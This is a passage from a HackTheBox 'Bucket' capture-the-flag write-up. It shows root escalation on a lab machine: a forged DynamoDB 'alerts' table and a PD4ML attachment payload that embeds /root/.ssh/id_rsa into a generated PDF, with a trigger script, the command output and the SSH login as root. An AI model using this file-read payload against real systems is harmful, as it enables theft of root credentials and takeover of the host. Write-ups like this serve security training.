</span></span></span></code></pre></div><p>From the enumeration above on the DynamoDB, I know there is no table called <code>alerts</code>.</p><p>The idea is, if I have a control over the <code>alerts</code> table as well as the write and read operations on the table, then I can abuse this web application to read almost any file on the system* (arbitrary file read).</p><blockquote><p>*The web application is currently running as root</p></blockquote><h4 id=obtain-root-ssh-key>Obtain root SSH Key<a class=anchor aria-hidden=true href=#obtain-root-ssh-key>#</a></h4><p>First I’ll try to create a dummy table on the database. I’ll be using JSON format and save it to a file called <code>test-table.json</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nt>&#34;TableName&#34;</span><span class=p>:</span> <span class=s2>&#34;iamf&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=nt>&#34;AttributeDefinitions&#34;</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>	<span class=p>[</span>
</span></span><span class=line><span class=cl>		<span class=p>{</span> <span class=nt>&#34;AttributeName&#34;</span><span class=p>:</span> <span class=s2>&#34;Name&#34;</span><span class=p>,</span> <span class=nt>&#34;AttributeType&#34;</span> <span class=p>:</span> <span class=s2>&#34;S&#34;</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>],</span>
</span></span><span class=line><span class=cl>	<span class=nt>&#34;KeySchema&#34;</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>	<span class=p>[</span> 
</span></span><span class=line><span class=cl>		<span class=p>{</span> <span class=nt>&#34;AttributeName&#34;</span><span class=p>:</span> <span class=s2>&#34;Name&#34;</span><span class=p>,</span> <span class=nt>&#34;KeyType&#34;</span> <span class=p>:</span> <span class=s2>&#34;HASH&#34;</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>],</span>
</span></span><span class=line><span class=cl>	<span class=nt>&#34;ProvisionedThroughput&#34;</span> <span class=p>:</span> 
</span></span><span class=line><span class=cl>		<span class=p>{</span> <span class=nt>&#34;WriteCapacityUnits&#34;</span><span class=p>:</span> <span class=mi>5</span><span class=p>,</span> <span class=nt>&#34;ReadCapacityUnits&#34;</span><span class=p>:</span> <span class=mi>10</span> <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Now I can use the subcommand <code>create-table</code> with <code>--cli-input-json</code> option and supply the JSON file on it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class=line><span class=cl>$ aws dynamodb create-table --cli-input-json file://test-table.json --endpoint-url  http://s3.bucket.htb
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;TableDescription&#34;</span>: <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;AttributeDefinitions&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>            <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;AttributeName&#34;</span>: <span class=s2>&#34;Name&#34;</span>,
</span></span><span class=line><span class=cl>                <span class=s2>&#34;AttributeType&#34;</span>: <span class=s2>&#34;S&#34;</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=o>]</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;TableName&#34;</span>: <span class=s2>&#34;iamf&#34;</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;KeySchema&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>            <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;AttributeName&#34;</span>: <span class=s2>&#34;Name&#34;</span>,
</span></span><span class=line><span class=cl>                <span class=s2>&#34;KeyType&#34;</span>: <span class=s2>&#34;HASH&#34;</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=o>]</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;TableStatus&#34;</span>: <span class=s2>&#34;ACTIVE&#34;</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;CreationDateTime&#34;</span>: <span class=s2>&#34;2021-04-22T15:22:33.634000-04:00&#34;</span>,
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span></code></pre></div><p>Using the subcommand <code>list-tables</code>, I can confirm that the table has been created. I also notice that I can insert items into this table.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class=line><span class=cl>$ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;TableNames&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;iamf&#34;</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;users&#34;</span>
</span></span><span class=line><span class=cl>    <span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></div><p>Knowing this, now I can create the <code>alerts</code> table. I’ll write it on JSON format as well.</p><p><code>alert-table.json</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;TableName&#34;</span><span class=p>:</span> <span class=s2>&#34;alerts&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;AttributeDefinitions&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=p>[</span>
</span></span><span class=line><span class=cl>                <span class=p>{</span><span class=nt>&#34;AttributeName&#34;</span><span class=p>:</span> <span class=s2>&#34;title&#34;</span><span class=p>,</span> <span class=nt>&#34;AttributeType&#34;</span> <span class=p>:</span> <span class=s2>&#34;S&#34;</span><span class=p>},</span>
</span></span><span class=line><span class=cl>                <span class=p>{</span><span class=nt>&#34;AttributeName&#34;</span><span class=p>:</span> <span class=s2>&#34;data&#34;</span><span class=p>,</span> <span class=nt>&#34;AttributeType&#34;</span> <span class=p>:</span> <span class=s2>&#34;S&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>],</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;KeySchema&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=p>[</span>
</span></span><span class=line><span class=cl>                <span class=p>{</span><span class=nt>&#34;AttributeName&#34;</span><span class=p>:</span> <span class=s2>&#34;title&#34;</span><span class=p>,</span> <span class=nt>&#34;KeyType&#34;</span> <span class=p>:</span> <span class=s2>&#34;HASH&#34;</span><span class=p>},</span>
</span></span><span class=line><span class=cl>                <span class=p>{</span><span class=nt>&#34;AttributeName&#34;</span><span class=p>:</span> <span class=s2>&#34;data&#34;</span><span class=p>,</span> <span class=nt>&#34;KeyType&#34;</span> <span class=p>:</span> <span class=s2>&#34;RANGE&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>],</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;ProvisionedThroughput&#34;</span> <span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span><span class=nt>&#34;WriteCapacityUnits&#34;</span><span class=p>:</span> <span class=mi>5</span><span class=p>,</span> <span class=nt>&#34;ReadCapacityUnits&#34;</span><span class=p>:</span> <span class=mi>10</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Now to abuse the application for file read, I’ll put the root SSH key path within <code>&lt;pd4ml:attachment></code> tags. The tags can be used to embed a file [<a href=https://pd4ml.com/html.htm>source</a>]. I&rsquo;ll write it on JSON format and name it as <code>payload.json</code></p><p><code>payload.json</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nt>&#34;title&#34;</span><span class=p>:</span> <span class=p>{</span> <span class=nt>&#34;S&#34;</span><span class=p>:</span> <span class=s2>&#34;Ransomware&#34;</span> <span class=p>},</span> 
</span></span><span class=line><span class=cl>    <span class=nt>&#34;data&#34;</span><span class=p>:</span> <span class=p>{</span> <span class=nt>&#34;S&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;pd4ml:attachment&gt;file:///root/.ssh/id_rsa&lt;/pd4ml:attachment&gt;&#34;</span> <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>And finally, I’ll use a bash script to perform the execution, this is because there is a clean up script on the box. I’ll name the script as <code>getroot.sh</code>.</p><p><code>getroot.sh</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;[+] Create table&#34;</span>
</span></span><span class=line><span class=cl>aws dynamodb create-table --cli-input-json file://alerts-table.json --endpoint-url<span class=o>=</span>http://s3.bucket.htb &gt;/dev/null
</span></span><span class=line><span class=cl>sleep 0.5
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;[+] Insert item&#34;</span>
</span></span><span class=line><span class=cl>aws dynamodb put-item --table-name alerts --item file://insert.json --endpoint-url<span class=o>=</span>http://s3.bucket.htb &gt;/dev/null
</span></span><span class=line><span class=cl>sleep 0.5
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;[+] Send get alerts&#34;</span>
</span></span><span class=line><span class=cl>curl -svd <span class=s2>&#34;action=get_alerts&#34;</span> http://127.0.0.1:8000/ <span class=c1># The port 8000 on Bucket forwarded to localhost:8000</span>
</span></span></code></pre></div><blockquote><p>The script assume all the required files are stored in the same folder.</p></blockquote><p>I’ll watch the <code>result.pdf</code> at <code>/var/www/bucket/files</code> and grab the SSH key using <code>roy</code>’s session.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>roy@bucket:/var/www/bucket-app/files$ <span class=k>while</span> sleep 2<span class=p>;</span> <span class=k>do</span> sed -n <span class=s1>&#39;/^-----BEGIN OPENSSH PRIVATE KEY-----$/,/^-----END OPENSSH PRIVATE KEY-----$/p&#39;</span> * 2&gt;/dev/null<span class=p>;</span> <span class=k>done</span>
</span></span></code></pre></div><p>Now I can just execute the <code>getroot.sh</code> script and wait for it to complete.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class=line><span class=cl>$ ./getroot.sh  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Create table
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Insert item
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Send get alerts
</span></span><span class=line><span class=cl>*   Trying 127.0.0.1:8000...
</span></span><span class=line><span class=cl>* TCP_NODELAY <span class=nb>set</span>
</span></span><span class=line><span class=cl>* Connected to 127.0.0.1 <span class=o>(</span>127.0.0.1<span class=o>)</span> port <span class=m>8000</span> <span class=o>(</span><span class=c1>#0)</span>
</span></span><span class=line><span class=cl>&gt; POST / HTTP/1.1
</span></span><span class=line><span class=cl>&gt; Host: 127.0.0.1:8000
</span></span><span class=line><span class=cl>&gt; User-Agent: curl/7.66.0
</span></span><span class=line><span class=cl>&gt; Accept: */*
</span></span><span class=line><span class=cl>&gt; Content-Length: <span class=m>17</span>
</span></span><span class=line><span class=cl>&gt; Content-Type: application/x-www-form-urlencoded
</span></span><span class=line><span class=cl>&gt; 
</span></span><span class=line><span class=cl>* upload completely sent off: <span class=m>17</span> out of <span class=m>17</span> bytes
</span></span><span class=line><span class=cl>* Mark bundle as not supporting multiuse
</span></span><span class=line><span class=cl>&lt; HTTP/1.1 <span class=m>200</span> OK
</span></span><span class=line><span class=cl>&lt; Date: Thu, <span class=m>22</span> Apr <span class=m>2021</span> 20:04:14 GMT
</span></span><span class=line><span class=cl>&lt; Server: Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl>&lt; Content-Length: <span class=m>0</span>
</span></span><span class=line><span class=cl>&lt; Content-Type: text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>UTF-8
</span></span><span class=line><span class=cl>&lt; 
</span></span><span class=line><span class=cl>* Connection <span class=c1>#0 to host 127.0.0.1 left intact</span>
</span></span></code></pre></div><p>On <code>roy</code> shell, I can see it the SSH key.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>roy@bucket:/var/www/bucket-app/files$ <span class=k>while</span> sleep 1<span class=p>;</span> <span class=k>do</span> sed -n <span class=s1>&#39;/^-----BEGIN OPENSSH PRIVATE KEY-----$/,/^-----END OPENSSH PRIVATE KEY-----$/p&#39;</span> * 2&gt;/dev/null<span class=p>;</span> <span class=k>done</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-----BEGIN OPENSSH PRIVATE KEY-----
</span></span><span class=line><span class=cl>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>-----END OPENSSH PRIVATE KEY-----
</span></span></code></pre></div><p>The full process as shown below:</p><p><div class=img-container><img src=imgs/image-20210425032310617.png alt=image-20210425032310617></div></p><p>I’ll save that key as <code>root_rsa</code> and change its permission to 600.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class=line><span class=cl>$ chmod <span class=m>600</span> root_rsa
</span></span></code></pre></div><p>After that, I can just login as root user using the SSH key I obtained.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class=line><span class=cl>$ ssh -i root_rsa 10.10.10.212
</span></span><span class=line><span class=cl>Welcome to Ubuntu 20.04 LTS <span class=o>(</span>GNU/Linux 5.4.0-48-generic x86_64<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>  IPv4 address <span class=k>for</span> br-bee97070fb20: 172.18.0.1
</span></span><span class=line><span class=cl>  IPv4 address <span class=k>for</span> docker0:         172.17.0.1
</span></span><span class=line><span class=cl>  IPv4 address <span class=k>for</span> ens160:          10.10.10.212
</span></span><span class=line><span class=cl>  IPv6 address <span class=k>for</span> ens160:          dead:beef::250:56ff:feb9:df48
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>root@bucket:~# id<span class=p>;</span>hostname<span class=p>;</span>cut -c-15 root.txt 
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>
</span></span><span class=line><span class=cl>bucket
</span></span><span class=line><span class=cl>efc73dd09ceb705
</span></span></code></pre></div><div class=post-references><h2>References</h2><ul><li><a href=https://book.hacktricks.xyz/pentesting/pentesting-web/buckets/aws-s3 target=_blank rel="noopener noreferrer">https://book.hacktricks.xyz/pentesting/pentesting-web/buckets/aws-s3</a></li><li><a href=https://pd4ml.com/html.htm target=_blank rel="noopener noreferrer">https://pd4ml.com/html.htm</a></li></ul></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/linux/>Linux</a></li><li><a href=https://fahmifj.github.io/tags/aws/>AWS</a></li><li><a href=https://fahmifj.github.io/tags/localstack/>LocalStack</a></li><li><a href=https://fahmifj.github.io/tags/s3/>S3</a></li><li><a href=https://fahmifj.github.io/tags/dynamodb/>DynamoDB</a></li><li><a href=https://fahmifj.github.io/tags/webshell/>Webshell</a></li><li><a href=https://fahmifj.github.io/tags/code-review/>Code-review</a></li><li><a href=https://fahmifj.github.io/tags/tunneling/>Tunneling</a></li><li><a href=https://fahmifj.github.io/tags/pd4ml/>PD4ML</a></li><li><a href=https://fahmifj.github.io/tags/gobuster/>Gobuster</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Bucket on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20Bucket&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fbucket%2f&hashtags=Linux%2cAWS%2cLocalStack%2cS3%2cDynamoDB%2cWebshell%2cCode-review%2cTunneling%2cPD4ML%2cGobuster"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Bucket on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fbucket%2f&title=HackTheBox%20-%20Bucket&summary=HackTheBox%20-%20Bucket&source=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fbucket%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Bucket on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fbucket%2f&title=HackTheBox%20-%20Bucket"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Bucket on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fbucket%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Bucket on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20Bucket%20-%20https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fbucket%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Bucket on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20Bucket&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fbucket%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></div></main><footer class=footer><span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>&nbsp;&&nbsp;<a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>&nbsp;(mod)</span>
<span><span class=copyright>&copy; 2022&nbsp;<a href=https://fahmifj.github.io/about>Fahmi FJ</a></span>
&nbsp;·&nbsp;
<span class=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a></span></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>